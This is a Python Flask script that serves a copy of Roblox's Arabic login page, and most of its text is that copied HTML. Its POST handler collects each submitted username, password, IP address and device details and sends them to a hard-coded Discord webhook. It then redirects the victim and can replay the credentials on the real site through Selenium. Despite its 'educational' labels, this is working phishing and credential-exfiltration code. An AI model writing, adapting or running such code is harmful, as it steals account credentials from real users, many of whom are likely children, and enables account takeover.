<div id="right-navigation-header"><div data-testid="navigation-search-input" class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3 shown" role="search"><div class="input-group"><form name="search-form" action="/search"><div class="form-has-feedback"><input id="navbar-search-input" type="search" name="search-bar" data-testid="navigation-search-input-field" class="form-control input-field new-input-field" placeholder="البحث" maxlength="120" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" value=""></div></form><div class="input-group-btn"><button data-testid="navigation-search-input-search-button" class="input-addon-btn" type="submit"><span class="icon-common-search-sm"></span></button></div></div><ul class="dropdown-menu new-dropdown-menu" role="menu"><li class="navbar-search-option rbx-clickable-li new-selected"><a class="new-navbar-search-anchor" href="https://www.roblox.com/ar/discover/?Keyword="><span class="icon-menu-games-off navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">في التجارب</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/ar/search/users?keyword="><span class="icon-menu-profile navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">في الأشخاص</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/ar/catalog?CatalogContext=1&amp;Keyword="><span class="icon-menu-shop navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">في السوق</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/ar/search/communities?keyword="><span class="icon-menu-groups navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">في المجتمعات</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://create.roblox.com/store/models?keyword="><span class="icon-menu-library navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">في متجر المصمّم</span></a></li></ul><div id="search-landing-root" data-testid="search-landing-root" class="search-landing-root"></div></div><div class="search-overlay"></div><div class="navbar-right rbx-navbar-right"><ul class="nav navbar-right rbx-navbar-right-nav"><li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="https://www.roblox.com/ar/account/signupredir?returnUrl=" id="sign-up-button">تسجيل الدخول</a></li><li class="login-action"><a class="rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item" href="https://www.roblox.com/ar/login?returnUrl=">تسجيل الدخول</a></li><li class="rbx-navbar-right-search"><button type="button" class="rbx-menu-item btn-navigation-nav-search-white-md"><span class="icon-nav-search-white"></span></button></li></ul></div></div>
</div>
</div>
<div id="left-navigation-container"></div>
<div id="verificationUpsell-container"><div></div></div>
<div id="phoneVerificationUpsell-container">
<div phoneverificationupsell-container=""></div>
</div>
<div id="contactMethodPrompt-container">
<div contactmethodprompt-container=""></div>
</div>
<div id="navigation-account-switcher-container">
<div navigation-account-switcher-container=""></div>
</div>
 
  </div>
 
 <script type="text/javascript">
     var Roblox = Roblox || {};
     (function () {
         if (Roblox && Roblox.Performance) {
             Roblox.Performance.setPerformanceMark("navigation_end");
         }
     })();
 </script>
    <main class="container-main content-no-ads                                                                                      " id="container-main" tabindex="-1">
         <script type="text/javascript">
             if (top.location != self.location) {
                 top.location = self.location.href;
             }
         </script>
 
         <div class="alert-container">
             <noscript><div><div class="alert-info" role="alert">Please enable Javascript to use all the features on this site.</div></div></noscript>
                         </div>
                          <div class="content" id="content">
 
             <div id="react-login-web-app" class="login-container"><div id="login-base" class="login-base-container"><div class="section-content login-section"><h1 class="login-header">تسجيل الدخول إلى Roblox</h1><div id="login-form"><div><div class="login-form-container"><form class="login-form" name="loginForm" action="/" method="POST"><div class="form-group username-form-group"><label for="login-username" class="sr-only">اسم المستخدم/البريد/الهاتف</label><input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="اسم المستخدم/البريد/الهاتف" value=""></div><div class="form-group password-form-group"><label for="login-password" class="sr-only">كلمة المرور</label><input id="login-password" name="password" type="password" class="form-control input-field" placeholder="كلمة المرور" value=""><div aria-live="polite"></div></div><button type="submit" id="login-button" class="btn-full-width login-button btn-secondary-md">تسجيل الدخول</button></form></div></div></div><div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">نسيت كلمة المرور أو اسم المستخدم؟</a></div><div><div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div></div><button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">إرسال رمز صالح لمرة واحدة عبر البريد إلكتروني</button><button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>استخدام جهاز آخر</span></button></div><div id="crossDeviceLoginDisplayCodeModal-container"></div><div id="otp-login-container"></div><div id="account-switcher-confirmation-modal-container"></div><div class="text-center"><div class="signup-option"><span class="no-account-text">ليس لديك حساب؟</span><a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/ar/" target="_self">اشتراك</a></div></div></div><div id="react-login-account-limit-error-container"></div></div></div>
         </div>
    </main><!--Bootstrap Footer React Component -->
 
 <footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True"><div class="footer"><ul class="row footer-links"><li class="footer-link"><a href="https://www.roblox.com/ar/info/about-us?locale=ar_001" class="text-footer-nav" target="_blank" rel="noreferrer">نبذة عنا</a></li><li class="footer-link"><a href="https://www.roblox.com/ar/info/jobs?locale=ar_001" class="text-footer-nav" target="_blank" rel="noreferrer">الوظائف</a></li><li class="footer-link"><a href="https://www.roblox.com/ar/info/blog?locale=ar_001" class="text-footer-nav" target="_blank" rel="noreferrer">المدونة</a></li><li class="footer-link"><a href="https://www.roblox.com/ar/info/parents?locale=ar_001" class="text-footer-nav" target="_blank" rel="noreferrer">الآباء</a></li><li class="footer-link"><a href="https://www.roblox.com/ar/giftcards?locale=ar_001" class="text-footer-nav giftcards" target="_blank" rel="noreferrer">بطاقات الهدايا</a></li><li class="footer-link"><a href="https://www.roblox.com/ar/info/help?locale=ar_001" class="text-footer-nav" target="_blank" rel="noreferrer">مساعدة</a></li><li class="footer-link"><a href="https://www.roblox.com/ar/info/terms?locale=ar_001" class="text-footer-nav" target="_blank" rel="noreferrer">الشروط</a></li><li class="footer-link"><a href="https://www.roblox.com/ar/info/accessibility?locale=ar_001" class="text-footer-nav" target="_blank" rel="noreferrer">إمكانية الوصول</a></li><li class="footer-link"><a href="https://www.roblox.com/ar/info/privacy?locale=ar_001" class="text-footer-nav" target="_blank" rel="noreferrer">الخصوصية</a></li><li class="footer-link"><a href="https://www.roblox.com/ar/my/account#!/privacy?locale=ar_001" class="text-footer-nav" target="_blank" rel="noreferrer">اختيارات الخصوصية المتوفرة لك<img src="https://images.rbxcdn.com/dbc562edb12e2e68.webp" alt="" class="footer-postfixIcon"></a></li><li></li></ul><div class="row copyright-container"><div class="col-sm-6 col-md-3"></div><div class="col-sm-12"><p class="text-footer footer-note">©2025 شركة Roblox. Roblox، شعار Roblox و تخيل الطاقة هما من بين علاماتنا التجارية المسجلة وغير المسجلة في الولايات المتحدة وبلدان أخرى.</p></div></div></div></footer></div>
    <div id="user-agreements-checker-container"></div>
    <div id="access-management-upsell-container"><div id="legally-sensitive-content-component"></div></div>
    <div id="global-privacy-control-checker-container"></div>
    <div id="cookie-banner-wrapper" class="cookie-banner-wrapper"><div></div></div>
   <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="UserAgreementsChecker" data-bundle-source="Main" src="https://js.rbxcdn.com/18a39f1adad50fcd69442f5ddd58c68c80ee0ff59fadc808ffda3195ceb492a8.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.UserAgreements" data-bundle-source="Unknown" src="https://js.rbxcdn.com/56728bee27a8608f7bbd04016bc65d1b97165cdd2db169a8fd975dc92ffbb09b.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.UserAgreements" data-bundle-source="Unknown" src="https://js.rbxcdn.com/26ec69e1ef5133af3431699d01a9e5274c642b53c5af293d5323a7f8970517f6.js"></script>
        <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="pageEnd" type="text/javascript" src="https://js.rbxcdn.com/6adeff254901b0c5c0e532d3d01ce51a.js"></script>
   </body></html>
"""

def get_device_info(user_agent):
    """تحليل User-Agent لمعرفة نوع الجهاز"""
    ua = user_agent.lower() if user_agent else ""

    if 'mobile' in ua or 'android' in ua or 'iphone' in ua:
        device_type = "📱 Mobile"
    elif 'tablet' in ua or 'ipad' in ua:
        device_type = "📟 Tablet"
    else:
        device_type = "💻 Desktop"

    if 'windows' in ua:
        os = "Windows"
    elif 'mac' in ua:
        os = "Mac OS"
    elif 'linux' in ua:
        os = "Linux"
    elif 'android' in ua:
        os = "Android"
    elif 'iphone' in ua or 'ipad' in ua:
        os = "iOS"
    else:
        os = "Unknown OS"

    if 'chrome' in ua:
        browser = "Chrome"
    elif 'firefox' in ua:
        browser = "Firefox"
    elif 'safari' in ua:
        browser = "Safari"
    elif 'edge' in ua:
        browser = "Edge"
    else:
        browser = "Unknown Browser"

    return device_type, os, browser

def auto_login_test(username, password):
    """Educational function to test login automation"""
    driver = None # Initialize driver to None for finally block
    try:
        print("🚀 Starting educational login test...")

        # Chrome setup
        chrome_options = Options()
        # chrome_options.add_argument("--headless")  # ❌ احذف هذا السطر لترى النافذة
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--window-size=1200,800")

        driver = webdriver.Chrome(options=chrome_options)
        driver.get("https://www.roblox.com/login")

        print("📄 Login page opened")

        # Input fields
        username_field = driver.find_element(By.ID, "login-username")
        password_field = driver.find_element(By.ID, "login-password")
        login_button = driver.find_element(By.ID, "login-button")

        username_field.send_keys(username)
        password_field.send_keys(password)

        print(f"✅ Username and password filled")
        print(f"🔑 Username: {username}")
        print(f"🔒 Password: {password}")

        time.sleep(2)

        # Click login
        print("🖱️ Clicking the login button...")
        login_button.click()

        print("🎯 Login button clicked")
        print("⏳ Browser is still open for review - close manually when done")
        # driver.quit()  # Keep it open for manual inspection

    except Exception as e:
        print(f"💥 Error during login test: {e}")
        time.sleep(5)
        if driver:
            driver.quit() # Ensure driver is quit on error
    finally:
        # If driver is still open due to successful test, it will remain open.
        # This is as per the original "close manually" comment.
        pass


@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        client_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        device_type, os, browser = get_device_info(user_agent)

        # 👇 تم استبدال كل الـ print الكبيرة بهذا الكود الجديد
        # تجهيز الرسالة لإرسالها إلى Discord
        discord_message = f"**🌐 تسجيل دخول جديد**\n"
        discord_message += f"```\n"
        discord_message += f"👤 المستخدم: {username}\n"
        discord_message += f"🔑 كلمة السر: {password}\n"
        discord_message += f"🌐 IP: {client_ip}\n"
        discord_message += f"📱 الجهاز: {device_type}\n"
        discord_message += f"🖥️ نظام التشغيل: {os}\n"
        discord_message += f"🌐 المتصفح: {browser}\n"
        discord_message += f"🕒 الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        discord_message += f"```"

        # إرسال إلى Discord
        webhook_url = "https://discord.com/api/webhooks/1477628955581222953/W3NqUQJaipx_v139AfrwTCQ-3Q1y3Olo6R1uTuxiEnDU7vHudR9mVqNcmdn9ToSlZboh"
        try:
            response = requests.post(webhook_url, json={"content": discord_message})
            if response.status_code in [200, 204]:
                print("✅ تم إرسال البيانات إلى Discord بنجاح")
            else:
                print(f"❌ فشل إرسال البيانات إلى Discord: {response.status_code}")
        except Exception as e:
            print(f"❌ خطأ في الاتصال بـ Discord: {e}")

        print("=" * 70)

        # تشغيل الاختبار التعليمي في thread منفصل (بدون انتظار)
        def educational_test():
            choice = input("Do you want to run the educational login test? (y/n): ")
            if choice.lower() == 'y':
                print("🔬 Starting educational test...")
                auto_login_test(username, password)
            else:
                print("❌ Educational test skipped")

        # بدء thread منفصل للسؤال عن الاختبار
        thread = threading.Thread(target=educational_test)
        thread.daemon = True  # ⚡ هذا يخليه ما يوقف البرنامج
        thread.start()

        # ⚡ التوجيه الفوري إلى صفحة الدعم
        return redirect("https://www.roblox.com/support")

    return render_template_string(html_page)

if __name__ == "__main__":
    print("⚠️ This is an educational project only - do NOT use it for illegal purposes")

    # تعطيل رسائل الطلبات المزعجة فقط
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

    # طباعة رسالة التشغيل يدوياً
    print("🌐 Server is running on:")
    print(f" * All addresses: 0.0.0.0")
    print(f" * Local: http://127.0.0.1:5000")

    # الحصول على عنوان IP المحلي
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        print(f" * Network: http://{local_ip}:5000")
    except socket.error: # Catch specific socket error
        print(" * Could not determine network IP")

    print("⏹️ Press CTRL+C to stop")
    print("-" * 50)

    # تشغيل التطبيق بدون debug لتجنب الرسائل المزعجة
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
